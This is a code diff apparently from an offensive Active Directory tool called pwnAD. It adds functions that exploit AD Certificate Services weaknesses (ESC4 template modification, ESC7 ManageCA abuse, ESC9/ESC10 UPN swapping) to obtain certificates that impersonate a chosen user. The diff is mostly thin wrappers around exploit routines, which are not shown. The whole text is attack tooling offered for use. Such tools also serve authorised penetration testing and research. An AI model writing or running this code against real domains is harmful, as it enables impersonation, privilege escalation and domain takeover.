@@ -1513,3 +1513,47 @@ def adcs_req(conn, ca_name, template, upn=None, dns=None, sid=None,
         print(f"\n[+] Certificate saved to: {pfx_path}")
     except Exception as e:
         logging.error(f"ADCS request error: {e}")
+
+
+def esc4(conn, ca_name, template, upn, ca_host=None, key_size=2048, output=None):
+    """ESC4: modify writable template, request cert, restore."""
+    try:
+        from pwnAD.lib.certreq import exploit_esc4
+        pfx_path, cert, key = exploit_esc4(
+            conn, ca_name=ca_name, template_name=template,
+            target_upn=upn, ca_host=ca_host,
+            key_size=key_size, output=output,
+        )
+        print(f"\n[+] ESC4 exploit successful — certificate saved to: {pfx_path}")
+    except Exception as e:
+        logging.error(f"ESC4 exploit error: {e}")
+
+
+def esc7(conn, ca_name, upn, template=None, ca_host=None,
+         key_size=2048, output=None, restore=True):
+    """ESC7: enable EDITF_ATTRIBUTESUBJECTALTNAME2 via ManageCA, request cert, restore."""
+    try:
+        from pwnAD.lib.certreq import exploit_esc7_manage_ca
+        pfx_path, cert, key = exploit_esc7_manage_ca(
+            conn, ca_name=ca_name, template_name=template,
+            target_upn=upn, ca_host=ca_host,
+            key_size=key_size, output=output, restore=restore,
+        )
+        print(f"\n[+] ESC7 exploit successful — certificate saved to: {pfx_path}")
+    except Exception as e:
+        logging.error(f"ESC7 exploit error: {e}")
+
+
+def esc9(conn, target_sam, ca_name, template, upn,
+         ca_host=None, key_size=2048, output=None):
+    """ESC9/ESC10: swap UPN on target, request cert, restore."""
+    try:
+        from pwnAD.lib.certreq import exploit_esc9
+        pfx_path, cert, key = exploit_esc9(
+            conn, target_sam=target_sam, ca_name=ca_name,
+            template_name=template, impersonate_upn=upn,
+            ca_host=ca_host, key_size=key_size, output=output,
+        )
+        print(f"\n[+] ESC9 exploit successful — certificate saved to: {pfx_path}")
+    except Exception as e:
+        logging.error(f"ESC9 exploit error: {e}")
